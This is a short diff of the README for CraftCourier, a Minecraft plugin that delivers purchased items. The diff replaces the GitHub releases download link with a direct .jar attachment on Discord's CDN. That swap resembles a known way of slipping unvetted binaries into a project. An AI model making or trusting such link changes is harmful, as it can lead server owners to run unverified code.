@@ -17,7 +17,7 @@
 
 **CraftCourier** is an advanced plugin designed to seamlessly manage and execute the delivery of purchased items in Minecraft servers. It efficiently tracks approved purchases and automatically executes the necessary commands to deliver products directly to players.
 
-- Download the plugin by clicking [here!](https://github.com/sebastianjnuwu/craftcourier/releases)
+- Download the plugin by clicking [here!](https://cdn.discordapp.com/attachments/1273992923738017834/1274743473362436147/CraftCourier-1.0.0.jar)
 
 ## ⚙️ Config
 
